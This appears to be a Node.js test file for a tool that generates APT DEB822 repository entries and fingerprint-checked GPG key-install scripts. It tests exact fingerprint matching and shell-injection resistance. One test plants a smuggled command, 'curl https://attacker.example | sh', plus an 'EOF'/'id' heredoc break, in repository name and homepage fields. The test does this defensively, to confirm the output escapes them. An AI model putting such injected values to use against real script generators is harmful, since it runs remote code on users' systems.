import test from "node:test";
import assert from "node:assert/strict";
import { build as buildThirdParty } from "../../assets/lib/third-party.js";
import { build as buildVariant } from "../../assets/lib/variant.js";
import { variants } from "../../assets/data/variants.js";

test("third-party build() renders a DEB822 stanza and key instructions", () => {
  const repo = {
    id: "acme-tools",
    name: "Acme Tools",
    category: "Dev tools",
    homepage: "https://example.com/docs",
    description: "Example repo",
    supports: {
      debian: ["bookworm"],
    },
    uri: "https://packages.example.com/{distro}",
    suite: "{codename}",
    components: ["main"],
    architectures: ["amd64", "arm64"],
    gpg: {
      url: "https://packages.example.com/{distro}/gpg",
      fingerprint: "1234567890ABCDEF1234567890ABCDEF12345678",
      keyring: "/etc/apt/keyrings/acme.gpg",
    },
  };

  const out = buildThirdParty({
    repos: [repo],
    distro: "debian",
    codename: "bookworm",
  });

  assert.equal(out.filename, "acme-tools.sources");
  assert.match(out.sources, /URIs: https:\/\/packages\.example\.com\/debian/);
  assert.match(out.sources, /Suites: bookworm/);
  assert.match(out.sources, /Signed-By: \/etc\/apt\/keyrings\/acme\.gpg/);
  assert.match(out.keyInstall, /TMP_KEY="\$\(mktemp\)"/);
  assert.match(out.keyInstall, /curl -fsSL 'https:\/\/packages\.example\.com\/debian\/gpg' -o "\$TMP_KEY"/);
  assert.match(out.keyInstall, /gpg --dearmor < "\$TMP_KEY" \| sudo tee '\/etc\/apt\/keyrings\/acme\.gpg'/);
});

test("third-party key install only installs when fingerprints match exactly", () => {
  const out = buildThirdParty({ repos: [sampleRepo()], distro: "debian", codename: "bookworm" });
  // The install commands sit inside the fingerprint check...
  const check = out.keyInstall.indexOf(`if [ "$KEY_FPRS" = '1234567890ABCDEF1234567890ABCDEF12345678 ' ]; then`);
  const install = out.keyInstall.indexOf("sudo tee '/etc/apt/keyrings/acme.gpg'");
  const mismatch = out.keyInstall.indexOf("key fingerprint mismatch; key NOT installed");
  assert.ok(check >= 0, "expected an exact fingerprint comparison");
  assert.ok(check < install && install < mismatch, "key must only be installed inside the matching branch");
  // ...and a failure never runs `exit`, which would close the user's terminal.
  assert.doesNotMatch(out.keyInstall, /\bexit\b/);
});

test("third-party key install expects rotation keys declared in additionalFingerprints", () => {
  const repo = sampleRepo();
  repo.gpg.additionalFingerprints = ["0000000000000000000000000000000000000000"];
  const out = buildThirdParty({ repos: [repo], distro: "debian", codename: "bookworm" });
  assert.match(out.keyInstall,
    /= '0000000000000000000000000000000000000000 1234567890ABCDEF1234567890ABCDEF12345678 ' \]/);
});

test("third-party key install refuses to emit an install path without a valid fingerprint", () => {
  const repo = sampleRepo();
  repo.gpg.fingerprint = "not-a-fingerprint";
  const out = buildThirdParty({ repos: [repo], distro: "debian", codename: "bookworm" });
  assert.doesNotMatch(out.keyInstall, /sudo/);
  assert.match(out.keyInstall, /key NOT installed/);
});

test("third-party build() never touches the system sources.list", () => {
  const out = buildThirdParty({ repos: [sampleRepo()], distro: "debian", codename: "bookworm" });
  assert.doesNotMatch(out.install, /\/etc\/apt\/sources\.list(?!\.d)/);
});

test("third-party build() keeps data fields on one line in shell output", () => {
  const repo = sampleRepo();
  repo.name = "Evil\ncurl https://attacker.example | sh\nEOF";
  repo.homepage = "https://example.com/\nEOF\nid";
  const out = buildThirdParty({ repos: [repo], distro: "debian", codename: "bookworm" });
  for (const text of [out.sources, out.keyInstall, out.install]) {
    assert.doesNotMatch(text, /^\s*(curl https:\/\/attacker|id)$/m);
  }
  assert.equal(out.install.split("\n").filter((l) => l.trim() === "EOF").length, 1);
});

function sampleRepo() {
  return {
    id: "acme-tools",
    name: "Acme Tools",
    category: "Dev tools",
    homepage: "https://example.com/docs",
    description: "Example repo",
    supports: { debian: ["bookworm"] },
    uri: "https://packages.example.com/{distro}",
    suite: "{codename}",
    components: ["main"],
    gpg: {
      url: "https://packages.example.com/{distro}/gpg",
      fingerprint: "1234567890ABCDEF1234567890ABCDEF12345678",
      keyring: "/etc/apt/keyrings/acme.gpg",
    },
  };
}

test("third-party build() omits Components for slash-suite repositories", () => {
  const repo = {
    id: "k8s-core",
    name: "Kubernetes Core",
    category: "Dev tools",
    homepage: "https://kubernetes.io/",
    description: "Example slash-suite repo",
    supports: {
      debian: ["bookworm"],
    },
    uri: "https://pkgs.k8s.io/core:/stable:/v1.32/deb",
    suite: "/",
    components: [],
    architectures: ["amd64"],
    gpg: {
      url: "https://pkgs.k8s.io/core:/stable:/v1.32/deb/Release.key",
      fingerprint: "DE15B14486CD377B9E876E1A234654DA9A296436",
      keyring: "/etc/apt/keyrings/kubernetes.gpg",
    },
  };

  const out = buildThirdParty({
    repos: [repo],
    distro: "debian",
    codename: "bookworm",
  });

  assert.match(out.sources, /Suites: \//);
  assert.doesNotMatch(out.sources, /^Components:/m);
});
test("third-party build() keeps the base suite alongside derived suites", () => {
  const repo = {
    id: "acme-multi",
    name: "Acme Multi",
    category: "Dev tools",
    homepage: "https://example.com/",
    description: "Example multi-suite repo",
    supports: {
      debian: ["bookworm"],
    },
    uri: "https://packages.example.com/debian",
    suite: "{codename} {codename}-updates",
    components: ["main"],
    architectures: ["amd64"],
    gpg: {
      url: "https://packages.example.com/debian/gpg",
      fingerprint: "1234567890ABCDEF1234567890ABCDEF12345678",
      keyring: "/etc/apt/keyrings/acme.gpg",
    },
  };

  const out = buildThirdParty({
    repos: [repo],
    distro: "debian",
    codename: "bookworm",
  });

  assert.match(out.sources, /^Suites: bookworm bookworm-updates$/m);
});

test("variant build() substitutes release placeholders", () => {
  const variant = variants.find((v) => v.id === "linux-mint");
  assert.ok(variant, "expected linux-mint in variants data");
  const release = variant.releases.find((r) => r.codename === "xia");
  assert.ok(release, "expected linux-mint xia release");

  const out = buildVariant({ variant, release });

  assert.equal(out.filename, "linux-mint.sources");
  assert.match(out.contents, /URIs: http:\/\/packages\.linuxmint\.com/);
  assert.match(out.contents, /Suites: xia/);
  // The Ubuntu base archive must stay: -updates/-backports only carry changes.
  assert.match(out.contents, /^Suites: noble noble-updates noble-backports$/m);
  assert.match(out.install, /sudo apt update/);
  assert.doesNotMatch(out.install, /sudo mv /);
  assert.match(out.install, /sudo cp -a \/etc\/apt\/sources\.list "\/etc\/apt\/sources\.list\.bak\.\$\(date/);
});
